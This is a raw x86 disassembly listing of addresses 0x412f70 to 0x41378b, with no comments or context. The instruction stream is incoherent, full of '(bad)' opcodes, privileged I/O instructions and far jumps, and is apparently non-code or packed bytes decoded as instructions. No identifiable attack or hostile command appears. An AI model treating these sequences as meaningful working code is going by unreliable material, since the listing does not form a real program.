  412f70:	dec    BYTE PTR [edx]
  412f72:	pop    ss
  412f73:	clc    
  412f74:	mov    esp,0x146049f9
  412f79:	pushf  
  412f7a:	loopne 0x412ff8
  412f7c:	daa    
  412f7d:	inc    esp
  412f7e:	ins    BYTE PTR es:[edi],dx
  412f7f:	sbb    dl,ch
  412f81:	pop    esi
  412f82:	ficomp WORD PTR [edx+0x6d]
  412f85:	sub    al,0xe2
  412f87:	aad    0xa3
  412f89:	mov    al,ds:0x548e3515
  412f8e:	cli    
  412f8f:	aam    0xce
  412f91:	dec    esp
  412f92:	or     eax,DWORD PTR [esi]
  412f94:	ret    
  412f95:	iret   
  412f96:	xor    al,0x4
  412f98:	pop    eax
  412f99:	shl    DWORD PTR ds:0xdb43a162,1
  412f9f:	pop    ss
  412fa0:	adc    eax,0xfbbfcd36
  412fa5:	xor    eax,0xabc030df
  412faa:	push   eax
  412fab:	cld    
  412fac:	pop    ebp
  412fad:	pop    ecx
  412fae:	call   0xdbe9:0x83327c2e
  412fb5:	repz adc WORD PTR [ecx+edx*2],dx
  412fba:	out    dx,al
  412fbb:	and    al,0x97
  412fbd:	aad    0x37
  412fbf:	jae    0x412f9e
  412fc1:	inc    ebp
  412fc2:	adc    BYTE PTR [edi-0x5d1a6314],dl
  412fc8:	je     0x412f50
  412fca:	icebp  
  412fcb:	pop    esi
  412fcc:	cmp    DWORD PTR [ebx],eax
  412fce:	(bad)  
  412fcf:	in     eax,0x4a
  412fd1:	dec    ebx
  412fd2:	dec    ecx
  412fd3:	push   0x6
  412fd5:	jo     0x412fa8
  412fd7:	in     eax,dx
  412fd8:	int3   
  412fd9:	jae    0x412f97
  412fdb:	mov    bl,0xf7
  412fdd:	and    BYTE PTR [edi+ebp*8],al
  412fe0:	leave  
  412fe1:	add    edi,DWORD PTR [edi]
  412fe3:	fdiv   st(4),st
  412fe5:	xchg   esi,eax
  412fe6:	mov    ah,0xa4
  412fe8:	pusha  
  412fe9:	adc    BYTE PTR [esi],bl
  412feb:	jne    0x412fac
  412fed:	out    0xf8,eax
  412fef:	xor    al,0xb1
  412ff1:	cmp    ah,dl
  412ff3:	sub    eax,edx
  412ff5:	fstp   st(7)
  412ff7:	and    DWORD PTR [edi+0x1d],esi
  412ffa:	scas   eax,DWORD PTR es:[edi]
  412ffb:	bound  ebx,QWORD PTR [esi-0x3]
  412ffe:	inc    ecx
  412fff:	xchg   esp,eax
  413000:	imul   eax,DWORD PTR [ebx+0x56],0xffffffb8
  413004:	stc    
  413005:	imul   edx,DWORD PTR [edi+0xe928051],0x9bc53687
  41300f:	push   ecx
  413010:	arpl   WORD PTR [edx+0x6d906519],ax
  413016:	mov    ecx,0x3c518d32
  41301b:	mov    dl,0xf3
  41301d:	enter  0x353e,0x1c
  413021:	xchg   ebx,eax
  413022:	fidiv  WORD PTR [eax+0x1]
  413025:	adc    DWORD PTR [eax-0x463585d0],ebp
  41302b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41302c:	cmp    BYTE PTR [ebp-0x61660ee6],0x16
  413033:	(bad)  
  413034:	shl    bl,cl
  413036:	ficom  DWORD PTR [eax-0x3e]
  413039:	jle    0x412fe2
  41303b:	das    
  41303c:	je     0x41306c
  41303e:	inc    eax
  41303f:	loope  0x412fd5
  413041:	sub    al,0x95
  413043:	stc    
  413044:	aaa    
  413045:	les    edi,FWORD PTR [eax*4+0x3c8f4e23]
  41304c:	xor    BYTE PTR [ecx+esi*2],dl
  41304f:	dec    edx
  413050:	test   eax,0xb1fe6b4a
  413055:	imul   edi,DWORD PTR [edi+ebp*8],0x5e38f49c
  41305c:	and    edx,eax
  41305e:	or     DWORD PTR [ebx+0x321a9e20],ebp
  413064:	mov    edx,0xb5b171ad
  41306a:	out    dx,eax
  41306b:	hlt    
  41306c:	popa   
  41306d:	inc    esi
  41306e:	jbe    0x413092
  413070:	mov    dh,0x2a
  413072:	adc    BYTE PTR [esi],ah
  413074:	imul   esp,DWORD PTR [edi-0x48],0xae4f1868
  41307b:	sub    bh,0x22
  41307e:	mov    al,ds:0x84baf790
  413083:	and    edx,DWORD PTR [edx+0xc]
  413086:	lea    esp,[esi-0x4d10baa]
  41308c:	fs mov cl,0x32
  41308f:	inc    esi
  413090:	mov    edi,0x912aed47
  413095:	adc    esi,DWORD PTR [edx+0x77e8b087]
  41309b:	icebp  
  41309c:	sti    
  41309d:	and    eax,0x1b3389de
  4130a2:	ins    DWORD PTR es:[edi],dx
  4130a3:	add    al,0x38
  4130a5:	in     eax,dx
  4130a6:	xchg   edi,eax
  4130a7:	jmp    0xec93:0x5a01265
  4130ae:	int3   
  4130af:	sbb    BYTE PTR [ecx],bl
  4130b1:	mov    eax,0x3a64acb
  4130b6:	or     edi,DWORD PTR [edx]
  4130b8:	xor    eax,0xad27e3ae
  4130bd:	stos   DWORD PTR es:[edi],eax
  4130be:	imul   ecx,DWORD PTR [edx+0x7257bf57],0x24
  4130c5:	add    DWORD PTR [esi],eax
  4130c7:	mov    gs,eax
  4130c9:	aaa    
  4130ca:	jbe    0x41305f
  4130cc:	shl    dh,0xb7
  4130cf:	lds    ecx,FWORD PTR [ecx+0x14f2dd2c]
  4130d5:	cwde   
  4130d6:	leave  
  4130d7:	mov    eax,0x47471ef1
  4130dc:	idiv   DWORD PTR [edi]
  4130de:	ror    BYTE PTR [ebx+0x2d763a26],1
  4130e4:	add    bh,BYTE PTR [edi-0x78bc159a]
  4130ea:	je     0x4130af
  4130ec:	ins    BYTE PTR es:[edi],dx
  4130ed:	hlt    
  4130ee:	xlat   BYTE PTR ds:[ebx]
  4130ef:	and    BYTE PTR [edi-0x30],0xe1
  4130f3:	(bad)  
  4130f4:	pusha  
  4130f5:	or     eax,0xd6da69cc
  4130fa:	jb     0x4130fe
  4130fc:	push   esi
  4130fd:	icebp  
  4130fe:	dec    eax
  4130ff:	and    eax,0x356679e8
  413104:	pop    eax
  413105:	out    dx,eax
  413106:	push   ebx
  413107:	cmp    DWORD PTR [edi+0x3989fa90],ebp
  41310d:	mov    dh,0xf8
  41310f:	stos   DWORD PTR es:[edi],eax
  413110:	adc    ebp,DWORD PTR ds:0x69fa0234
  413116:	loop   0x413172
  413118:	pop    edi
  413119:	ja     0x413107
  41311b:	sbb    eax,0x1b4c8b76
  413120:	das    
  413121:	dec    eax
  413122:	push   esp
  413123:	out    0x70,al
  413125:	sbb    eax,0x1787f5ef
  41312a:	je     0x413197
  41312c:	sub    ebp,DWORD PTR [eax]
  41312e:	aad    0xe8
  413130:	out    dx,al
  413131:	gs out dx,eax
  413133:	retf   
  413134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413135:	stos   DWORD PTR es:[edi],eax
  413136:	call   0x342dc45a
  41313b:	pushw  0x67
  41313e:	push   ds
  41313f:	das    
  413140:	retf   
  413141:	or     DWORD PTR [ecx],esi
  413143:	stos   DWORD PTR es:[edi],eax
  413144:	sbb    dl,BYTE PTR [ecx+ebx*8]
  413147:	xor    eax,0x529e2e5e
  41314c:	stos   BYTE PTR es:[edi],al
  41314d:	adc    BYTE PTR [ecx-0x5f],al
  413150:	pop    edx
  413151:	mov    edx,0x7042dc29
  413156:	out    0xc0,al
  413158:	neg    BYTE PTR fs:0xaf580d25
  41315f:	mov    ds:0x105ed0ca,eax
  413164:	adc    ah,BYTE PTR [ecx]
  413166:	cmp    DWORD PTR [esi],ebp
  413168:	aas    
  413169:	pop    edx
  41316a:	sbb    bh,BYTE PTR [edi+0x23]
  41316d:	mov    ds:0x956530b,al
  413172:	nop
  413173:	inc    edi
  413174:	cwde   
  413175:	stos   DWORD PTR es:[edi],eax
  413176:	cld    
  413177:	(bad)  
  413178:	mov    eax,0xa359438a
  41317d:	pop    edx
  41317e:	popa   
  41317f:	in     eax,0xd3
  413181:	lods   eax,DWORD PTR ds:[esi]
  413182:	push   ecx
  413183:	jg     0x413152
  413185:	jne    0x413159
  413187:	xchg   ebp,eax
  413188:	lods   al,BYTE PTR fs:[esi]
  41318a:	mov    eax,ds:0xd5135f44
  41318f:	or     eax,ecx
  413191:	jle    0x4131ba
  413193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413194:	dec    esp
  413195:	aaa    
  413196:	jb     0x4131b1
  413198:	mov    dl,0x88
  41319a:	or     al,cl
  41319c:	sub    dh,dl
  41319e:	inc    ebp
  41319f:	xchg   esi,eax
  4131a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131a1:	ja     0x4131bc
  4131a3:	aad    0x79
  4131a5:	xchg   BYTE PTR [edx+0x67d6ab0b],ch
  4131ab:	aad    0x52
  4131ad:	pop    esp
  4131ae:	bound  esp,QWORD PTR [ebx+0x75215ceb]
  4131b4:	xlat   BYTE PTR ds:[ebx]
  4131b5:	(bad)  
  4131b6:	or     bl,BYTE PTR [ecx-0x3c]
  4131b9:	popf   
  4131ba:	sbb    al,BYTE PTR [ebx-0x4d]
  4131bd:	pop    ebx
  4131be:	jp     0x413170
  4131c0:	mov    bl,0xc1
  4131c2:	fidiv  WORD PTR [ebx+0x66]
  4131c5:	mov    ch,0xbb
  4131c7:	or     ebp,ebp
  4131c9:	fisub  DWORD PTR [ebp-0x73bd2fbd]
  4131cf:	bound  edx,QWORD PTR [ebp+ebp*8+0x68]
  4131d3:	sti    
  4131d4:	add    eax,DWORD PTR [eax]
  4131d6:	push   eax
  4131d7:	into   
  4131d8:	int3   
  4131d9:	mov    al,ch
  4131db:	clc    
  4131dc:	fs jno 0x413201
  4131df:	test   BYTE PTR [ecx+0x4ded8da0],bh
  4131e5:	inc    edi
  4131e6:	pop    edx
  4131e7:	adc    DWORD PTR [eax+esi*8-0x3b],ebp
  4131eb:	or     BYTE PTR [edi+eax*4],0xc9
  4131ef:	sbb    eax,0x5f0456e0
  4131f4:	nop
  4131f5:	imul   ebx,esi,0x57a6954d
  4131fb:	inc    esi
  4131fc:	or     eax,0x96c09066
  413201:	stos   DWORD PTR es:[edi],eax
  413202:	retf   
  413203:	mov    BYTE PTR [eax],dh
  413205:	outs   dx,DWORD PTR ds:[esi]
  413206:	imul   DWORD PTR [edx+0x262248fe]
  41320c:	adc    DWORD PTR [ecx+0x72],ecx
  41320f:	or     eax,DWORD PTR [ecx-0x5afd9907]
  413215:	aaa    
  413216:	sub    BYTE PTR [edi-0x233a4632],al
  41321c:	push   ecx
  41321d:	pop    ds
  41321e:	add    DWORD PTR [edi-0x58a2184],esi
  413224:	stos   BYTE PTR es:[edi],al
  413225:	shr    DWORD PTR [ecx+0x2],cl
  413228:	jbe    0x413263
  41322a:	arpl   WORD PTR [ecx-0x40],sp
  41322d:	sub    ax,0x6c47
  413231:	adc    esp,edi
  413233:	inc    esp
  413234:	pop    edi
  413235:	pushf  
  413236:	jl     0x413231
  413238:	or     DWORD PTR [edi],0xd3517e3d
  41323e:	xchg   esi,eax
  41323f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413241:	pop    ebp
  413242:	hlt    
  413243:	cmp    al,0x1a
  413245:	lds    eax,FWORD PTR [ebp+0x56]
  413248:	mov    ebp,0x8c55562e
  41324d:	(bad)  
  41324e:	je     0x4131eb
  413250:	outs   dx,DWORD PTR ds:[esi]
  413251:	or     eax,0x391e6054
  413256:	xor    BYTE PTR [esi-0x67],ch
  413259:	repz gs push eax
  41325c:	fisttp WORD PTR cs:[ebx+edx*1+0x17b3d4e2]
  413264:	loopne 0x41328c
  413266:	mov    ds:0x3bc6ef9b,al
  41326b:	adc    ah,BYTE PTR [edx-0x4116d383]
  413271:	mov    dh,0x8
  413273:	push   ecx
  413274:	mov    edi,0xcfe4927
  413279:	jb     0x413231
  41327b:	push   0x24
  41327d:	fcomp  QWORD PTR [edi-0x6e904510]
  413283:	scas   al,BYTE PTR es:[edi]
  413284:	ficomp WORD PTR [edx]
  413286:	loop   0x4132fd
  413288:	and    al,0xad
  41328a:	sbb    al,0x4b
  41328c:	aad    0x96
  41328e:	and    DWORD PTR [eax-0x272e8df8],ebx
  413294:	lock pop esp
  413296:	sub    BYTE PTR [ebp+esi*1-0x40],0xc7
  41329b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41329c:	add    BYTE PTR [eax-0x44452aef],bh
  4132a2:	or     DWORD PTR [esi+0x12],0xcdb84b92
  4132a9:	jecxz  0x41322c
  4132ab:	out    dx,eax
  4132ac:	(bad)  
  4132ad:	hlt    
  4132ae:	fsubr  st(3),st
  4132b0:	dec    edx
  4132b1:	jp     0x41325d
  4132b3:	pushf  
  4132b4:	mov    ebx,0xb7e1f1e9
  4132b9:	mov    ebx,DWORD PTR [edi]
  4132bb:	jo     0x4132af
  4132bd:	xchg   edi,eax
  4132be:	jns    0x41327f
  4132c0:	es sub ah,bh
  4132c3:	arpl   WORD PTR [ebx+ebx*4],si
  4132c6:	pop    esp
  4132c7:	mov    ch,0xc3
  4132c9:	aad    0x7b
  4132cb:	xchg   ebp,eax
  4132cc:	pop    ecx
  4132cd:	repnz xchg esi,eax
  4132cf:	lea    edi,[eax+ecx*2+0x5921b456]
  4132d6:	js     0x41325e
  4132d8:	scas   al,BYTE PTR es:[edi]
  4132d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132da:	in     eax,0x2f
  4132dc:	mov    edx,0x665ced8d
  4132e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132e2:	pop    eax
  4132e3:	inc    esi
  4132e4:	or     BYTE PTR [ebx],al
  4132e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132e7:	adc    al,0xea
  4132e9:	imul   edx,DWORD PTR [ebx+0x39],0xffe6dbc5
  4132f0:	test   dh,ah
  4132f2:	data16 jne 0x41334c
  4132f5:	pop    ds
  4132f6:	add    esi,edi
  4132f8:	cli    
  4132f9:	xchg   esi,eax
  4132fa:	xor    ch,BYTE PTR [edx]
  4132fc:	mov    edx,db0
  4132ff:	sbb    DWORD PTR [ebx],0x1f
  413302:	icebp  
  413303:	in     al,dx
  413304:	dec    esi
  413305:	lea    esp,[ebp-0x66]
  413308:	lods   eax,DWORD PTR ds:[esi]
  413309:	jmp    0x75f7203c
  41330e:	daa    
  41330f:	mov    al,ds:0xa89ec357
  413314:	or     esi,DWORD PTR [edi+0x4b87594f]
  41331a:	mov    ch,0x73
  41331c:	fist   WORD PTR gs:[ebx+0x28]
  413320:	rcl    DWORD PTR [edx+0x173a4f2],cl
  413326:	inc    ebp
  413327:	aas    
  413328:	sar    BYTE PTR [esi],1
  41332a:	in     eax,dx
  41332b:	in     eax,0x6
  41332d:	cmp    al,bl
  41332f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413330:	repnz and ecx,esi
  413333:	xchg   ebp,eax
  413334:	cwde   
  413335:	push   ebx
  413336:	js     0x41333c
  413338:	xchg   edx,eax
  413339:	inc    ebp
  41333a:	fsub   QWORD PTR [esi]
  41333c:	popa   
  41333d:	sub    bl,BYTE PTR [eax+eiz*4-0x5c49d360]
  413344:	test   bh,bl
  413346:	fwait
  413347:	sbb    eax,0x82871f5d
  41334c:	cmc    
  41334d:	(bad)  
  41334e:	call   0xbedd862
  413353:	jns    0x41338b
  413355:	cmp    cl,dl
  413357:	(bad)  
  413358:	pushf  
  413359:	add    al,al
  41335b:	mov    ch,0x36
  41335d:	aam    0x74
  41335f:	dec    ebx
  413360:	es pop esp
  413362:	jb     0x4133d1
  413364:	in     eax,0x23
  413366:	std    
  413367:	ret    0xffaf
  41336a:	lods   eax,DWORD PTR ds:[esi]
  41336b:	test   BYTE PTR gs:[eax-0xa],0xfa
  413370:	rcr    bh,1
  413372:	adc    DWORD PTR [edx-0x73],ebx
  413375:	xor    BYTE PTR [ebx+0xd],dl
  413378:	sbb    al,0xe3
  41337a:	in     eax,dx
  41337b:	push   es
  41337c:	repz jecxz 0x413319
  41337f:	jns    0x4133b4
  413381:	test   DWORD PTR [ebx],ebp
  413383:	jecxz  0x4133fc
  413385:	push   ss
  413386:	lods   al,BYTE PTR ds:[esi]
  413387:	inc    eax
  413388:	imul   esp,DWORD PTR [eax+eiz*4],0xffffffca
  41338c:	or     dh,BYTE PTR gs:[eax-0x9]
  413390:	xchg   esi,eax
  413391:	scas   eax,DWORD PTR es:[edi]
  413392:	(bad)
  413396:	jnp    0x41337e
  413398:	add    DWORD PTR [edx],0xabd24c67
  41339e:	shl    DWORD PTR [ebx],cl
  4133a0:	out    dx,eax
  4133a1:	dec    ebp
  4133a2:	sbb    BYTE PTR [ebp-0x4c48f47e],ah
  4133a8:	inc    ebp
  4133a9:	gs out dx,al
  4133ab:	mov    BYTE PTR [edi],0xe8
  4133ae:	aam    0x7a
  4133b0:	pop    esp
  4133b1:	(bad)  
  4133b2:	scas   al,BYTE PTR es:[edi]
  4133b3:	xor    BYTE PTR cs:[ebx+esi*4],bh
  4133b7:	dec    edx
  4133b8:	fiadd  DWORD PTR [edi]
  4133ba:	push   esi
  4133bb:	or     DWORD PTR [ecx-0x8],ebp
  4133be:	in     al,dx
  4133bf:	cmp    ah,BYTE PTR [esp+eiz*4+0x30]
  4133c3:	push   ecx
  4133c4:	into   
  4133c5:	dec    esi
  4133c6:	daa    
  4133c7:	and    ebp,DWORD PTR [edx+0x62]
  4133ca:	cmp    bh,BYTE PTR [ebx]
  4133cc:	loope  0x413428
  4133ce:	push   esi
  4133cf:	adc    al,0x65
  4133d1:	sub    eax,DWORD PTR [ecx+edx*8+0x4c6020a]
  4133d8:	fistp  DWORD PTR [esi-0x70d5bdde]
  4133de:	jle    0x4133c1
  4133e0:	xchg   esi,eax
  4133e1:	mov    DWORD PTR [eax],edx
  4133e3:	pusha  
  4133e4:	jle    0x41341a
  4133e6:	loop   0x41342f
  4133e8:	stc    
  4133e9:	jo     0x4133e6
  4133eb:	mov    ebx,0x7a5459a7
  4133f0:	pop    ss
  4133f1:	test   al,0xde
  4133f3:	dec    ebx
  4133f4:	popa   
  4133f5:	fnstenv [esp+esi*4+0x75]
  4133f9:	fstp   TBYTE PTR [esi]
  4133fb:	or     DWORD PTR [edx-0x69a62926],ebp
  413401:	rcl    BYTE PTR [ecx-0x61077396],cl
  413407:	jmp    0xf6e19a17
  41340c:	in     eax,dx
  41340d:	in     eax,dx
  41340e:	in     eax,dx
  41340f:	cmp    al,cl
  413411:	dec    ecx
  413412:	jae    0x413468
  413414:	or     al,0xc5
  413416:	jl     0x41339c
  413418:	mov    ds:0xa4a14034,al
  41341d:	mov    esp,0xb0ab4ccc
  413422:	dec    esp
  413423:	mov    dl,0xd1
  413425:	lea    ecx,[ecx-0x586fee92]
  41342b:	jl     0x413415
  41342d:	in     eax,0x6f
  41342f:	xchg   BYTE PTR [esi+0x19],bh
  413432:	(bad)  
  413433:	xor    al,0x71
  413435:	mov    esp,0x14a3e984
  41343a:	mov    BYTE PTR [ebx+0x15917ad],al
  413440:	jb     0x413482
  413442:	cmp    DWORD PTR [edx+0x75eb514d],0x6de9d2ba
  41344c:	cmp    ch,BYTE PTR [edx+0x6f6f85c]
  413452:	and    BYTE PTR [eax+0x24],ch
  413455:	das    
  413456:	pop    ss
  413457:	push   esp
  413458:	cmovg  esi,edx
  41345b:	mov    dh,0xb7
  41345d:	ficom  WORD PTR [ebp+0x18]
  413460:	lods   eax,DWORD PTR ds:[esi]
  413461:	loope  0x41345f
  413463:	dec    eax
  413464:	jp     0x413431
  413466:	pop    ss
  413467:	loop   0x4134cf
  413469:	mov    ds:0xe4b3dfec,eax
  41346e:	cmp    edx,DWORD PTR [eax-0x34da4b7d]
  413474:	mov    DWORD PTR [edi-0x47],ecx
  413477:	mov    DWORD PTR [eax+esi*4],eax
  41347a:	mov    al,0x15
  41347c:	in     al,dx
  41347d:	add    dl,bl
  41347f:	cdq    
  413480:	shl    BYTE PTR [ebx+0x7b],0x98
  413484:	rol    BYTE PTR [edi+0x21],0xe4
  413488:	inc    eax
  413489:	inc    esi
  41348a:	push   esi
  41348b:	jns    0x413432
  41348d:	(bad)  
  41348e:	mov    cl,0xcb
  413490:	(bad)  
  413491:	repnz ins BYTE PTR es:[edi],dx
  413493:	das    
  413494:	xor    DWORD PTR [ebx+0xe580],esi
	...
  413512:	add    BYTE PTR [eax],al
  413514:	call   0xbb94:0xbf94b5b1
  41351b:	mov    edi,0x1b5d8b00
  413520:	stos   BYTE PTR es:[edi],al
  413521:	daa    
  413522:	mov    DWORD PTR [ebx+0xdced],ecx
  413528:	ins    BYTE PTR es:[edi],dx
  413529:	pop    es
  41352a:	add    BYTE PTR [eax],al
  41352c:	jae    0x41354b
  41352e:	clc    
  41352f:	and    edx,edi
  413531:	xchg   ecx,eax
  413532:	add    al,0xe2
  413534:	jnp    0x41352f
  413536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413537:	lods   eax,DWORD PTR ds:[esi]
  413538:	aad    0x36
  41353a:	mov    edx,0x54de292d
  41353f:	push   ds
  413540:	pop    ebx
  413541:	pop    ss
  413542:	pop    ss
  413543:	sbb    eax,0xa66cec7f
  413548:	faddp  st(2),st
  41354a:	sahf   
  41354b:	ins    DWORD PTR es:[edi],dx
  41354c:	jge    0x41352b
  41354e:	cwde   
  41354f:	scas   eax,DWORD PTR es:[edi]
  413550:	push   ss
  413551:	aam    0xdc
  413553:	dec    esp
  413554:	jmp    0x413552
  413556:	sar    DWORD PTR [ebp-0xbccb2e4],1
  41355c:	jecxz  0x4134f1
  41355e:	xchg   esp,eax
  41355f:	jns    0x413584
  413561:	daa    
  413562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413563:	jmp    0x413592
  413565:	je     0x413519
  413567:	pop    es
  413568:	ret    
  413569:	xor    al,0x48
  41356b:	test   esp,esi
  41356d:	and    eax,0xc8c3a710
  413572:	sbb    eax,ebp
  413574:	rol    DWORD PTR [edi+edi*4+0x35],0x2b
  413579:	mov    edi,DWORD PTR [edx+0x3e]
  41357c:	xor    bl,BYTE PTR [ecx]
  41357e:	ds nop
  413580:	sbb    DWORD PTR [edx],esp
  413582:	push   ebx
  413583:	adc    al,0x0
  413585:	pop    ds
  413586:	adc    edx,DWORD PTR [eax+0x4071e449]
  41358c:	fiadd  DWORD PTR [edi]
  41358e:	in     al,dx
  41358f:	in     al,dx
  413590:	out    0x21,al
  413592:	js     0x41358a
  413594:	dec    ebp
  413595:	enter  0x8735,0x2f
  413599:	iret   
  41359a:	rol    BYTE PTR [eax+0x21],0x4b
  41359e:	sub    edi,DWORD PTR [edx+0x6]
  4135a1:	xchg   al,cl
  4135a3:	loope  0x41358b
  4135a5:	inc    di
  4135a7:	and    ch,dl
  4135a9:	out    dx,al
  4135aa:	xchg   ebx,eax
  4135ab:	cmp    dh,bh
  4135ad:	dec    edi
  4135ae:	fidiv  DWORD PTR ds:0xdc9effba
  4135b4:	mov    DWORD PTR [edx],esi
  4135b6:	test   dl,bl
  4135b8:	pop    ds
  4135b9:	pop    ecx
  4135ba:	std    
  4135bb:	sub    BYTE PTR [ecx-0x5d],bl
  4135be:	sub    DWORD PTR [ebx],esi
  4135c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c1:	dec    ebx
  4135c2:	mov    edi,0xf4e6027c
  4135c7:	mov    ?,WORD PTR [edi+0x1f]
  4135ca:	stc    
  4135cb:	icebp  
  4135cc:	dec    edi
  4135cd:	fisttp QWORD PTR [ebp-0x47697533]
  4135d3:	out    0x1f,eax
  4135d5:	icebp  
  4135d6:	push   edx
  4135d7:	fild   DWORD PTR [ecx]
  4135d9:	adc    eax,0x4539677b
  4135de:	bound  esp,QWORD PTR [ecx+0x9]
  4135e1:	retf   0xebcc
  4135e4:	daa    
  4135e5:	push   ebp
  4135e6:	lahf   
  4135e7:	clc    
  4135e8:	jmp    0x41359d
  4135ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135eb:	jl     0x4135e4
  4135ed:	add    dl,BYTE PTR [edx-0x54035f82]
  4135f3:	enter  0x12db,0xc9
  4135f7:	fs pop ebp
  4135f9:	or     eax,0x2c74ee9f
  4135fe:	addps  xmm6,XMMWORD PTR [esi+0x5b8cf432]
  413605:	push   es
  413606:	jecxz  0x4135b2
  413608:	mov    edx,0x1047863d
  41360d:	(bad)  
  41360f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413611:	or     edi,esp
  413613:	sbb    BYTE PTR [esi+0x7903c324],bl
  413619:	cmp    bl,BYTE PTR [edx]
  41361b:	cmp    edx,ebp
  41361d:	int3   
  41361e:	call   0x71ef175e
  413623:	mov    edi,0x2166b02f
  413628:	dec    ecx
  413629:	cmp    eax,0x8c08331e
  41362e:	stos   BYTE PTR es:[edi],al
  41362f:	adc    al,0x50
  413631:	fcomip st,st(2)
  413633:	or     cl,BYTE PTR [eax]
  413635:	clc    
  413636:	adc    eax,0xc0a249b8
  41363b:	pop    ds
  41363c:	cmp    edi,DWORD PTR [esi+eax*4]
  41363f:	sbb    esi,DWORD PTR [edx]
  413641:	ja     0x4135e9
  413643:	test   eax,0x49e3e84e
  413648:	aaa    
  413649:	mov    ecx,edx
  41364b:	xchg   ebp,ebx
  41364d:	addr16 push ds
  41364f:	fcom   QWORD PTR [esi+0x7d49f1f6]
  413655:	mov    ebp,0xc8845be0
  41365a:	int3   
  41365b:	push   cs
  41365c:	cmp    DWORD PTR [edx-0x5],ebp
  41365f:	nop
  413660:	sar    ch,0x66
  413663:	in     eax,0x4d
  413665:	pop    eax
  413666:	adc    dh,bl
  413668:	xchg   BYTE PTR ss:[ecx],cl
  41366b:	les    esi,FWORD PTR [edi]
  41366d:	add    al,0x97
  41366f:	push   esp
  413670:	clc    
  413671:	ret    0x9d89
  413674:	mov    esi,0xe5203bb8
  413679:	in     al,dx
  41367a:	inc    ebp
  41367b:	xchg   ax,ax
  41367d:	sbb    eax,eax
  41367f:	jae    0x41365e
  413681:	pop    eax
  413682:	pop    ds
  413683:	call   0x86a8:0x6ca29d59
  41368a:	mov    al,ds:0x86d71568
  41368f:	add    eax,0x14d28616
  413694:	xchg   esp,eax
  413695:	sbb    BYTE PTR [ecx+0x73],dl
  413698:	jp     0x41368a
  41369a:	push   ds
  41369b:	aas    
  41369c:	in     al,0x16
  41369e:	jnp    0x4136a6
  4136a0:	out    0x43,al
  4136a2:	retf   
  4136a3:	adc    ebp,DWORD PTR [ecx]
  4136a5:	or     al,0x1f
  4136a7:	popf   
  4136a8:	sub    BYTE PTR [ecx+0x13],ah
  4136ab:	sub    eax,0x6061b017
  4136b0:	adc    eax,0x801d2f48
  4136b5:	cmp    esp,esp
  4136b7:	and    al,BYTE PTR [ecx+0x26d16b17]
  4136bd:	dec    esp
  4136be:	fcom   QWORD PTR [eax]
  4136c0:	or     DWORD PTR [edi],eax
  4136c2:	jo     0x4136ce
  4136c4:	xchg   esp,eax
  4136c5:	jae    0x41370f
  4136c7:	jmp    0xd04c:0xbc095fc3
  4136ce:	inc    edx
  4136cf:	inc    edx
  4136d0:	push   ebx
  4136d1:	or     BYTE PTR [ebx],0x93
  4136d4:	js     0x4136ee
  4136d6:	es nop
  4136d8:	mov    edi,0xcdfc257b
  4136dd:	neg    edi
  4136df:	add    eax,0xaef4882a
  4136e4:	repnz adc ch,BYTE PTR [ebx]
  4136e7:	call   0x7980:0x81fbb853
  4136ee:	inc    edx
  4136ef:	jmp    0x413752
  4136f1:	call   DWORD PTR [eax+0x60]
  4136f4:	push   cs
  4136f5:	mov    DWORD PTR [ebp+0x4d],esp
  4136f8:	mov    ds:0x354d375d,al
  4136fd:	out    dx,al
  4136fe:	aad    0x3b
  413700:	ins    BYTE PTR es:[edi],dx
  413701:	mov    ch,0x31
  413703:	rol    BYTE PTR [eax],1
  413705:	popfw  
  413707:	shl    BYTE PTR [ebx+0x307e9678],0x8e
  41370e:	or     dh,bh
  413710:	push   edi
  413711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413712:	(bad)  
  413714:	dec    eax
  413715:	mov    ch,BYTE PTR [ecx]
  413717:	pop    esi
  413718:	icebp  
  413719:	test   al,0x6f
  41371b:	inc    esp
  41371c:	pop    ss
  41371d:	addr16 inc esi
  41371f:	xor    esp,ebp
  413721:	sbb    eax,0x29d93021
  413726:	fldenv [edx+0x6f]
  413729:	push   ebp
  41372a:	jecxz  0x41373f
  41372c:	sub    eax,0xf1dd18c0
  413731:	nop
  413732:	adc    al,0xe7
  413734:	mov    edx,0xcaf290df
  413739:	cli    
  41373a:	xchg   esp,eax
  41373b:	ss ins BYTE PTR es:[edi],dx
  41373d:	sub    al,0x9d
  41373f:	inc    edx
  413740:	shr    DWORD PTR [esi-0x222841f5],1
  413746:	cmovno esp,DWORD PTR [ebx+0x68]
  41374a:	push   edi
  41374b:	inc    edx
  41374c:	ret    
  41374d:	std    
  41374e:	fcomip st,st(7)
  413750:	jecxz  0x413703
  413752:	out    dx,al
  413753:	push   es
  413754:	icebp  
  413755:	adc    DWORD PTR [edi-0x69],ecx
  413758:	jo     0x4136ff
  41375a:	push   edi
  41375b:	inc    edx
  41375c:	sbb    eax,0x9e7689b2
  413761:	xacquire xchg DWORD PTR [esi],ecx
  413764:	pop    ss
  413765:	mov    ecx,0xeadaf844
  41376a:	push   ebx
  41376b:	xchg   DWORD PTR [edi],eax
  41376d:	cmp    DWORD PTR [ecx],esi
  41376f:	jl     0x4136fa
  413771:	sub    BYTE PTR [edx+0x13],dh
  413774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413775:	call   0xace1:0x418738af
  41377c:	cwde   
  41377d:	shl    DWORD PTR [ebx+ebx*4-0x37],cl
  413781:	push   ecx
  413782:	cmp    eax,0x74604a7d
  413787:	jge    0x41372e
  413789:	(bad)  
  41378a:	push   esi
  41378b:	dec    esi
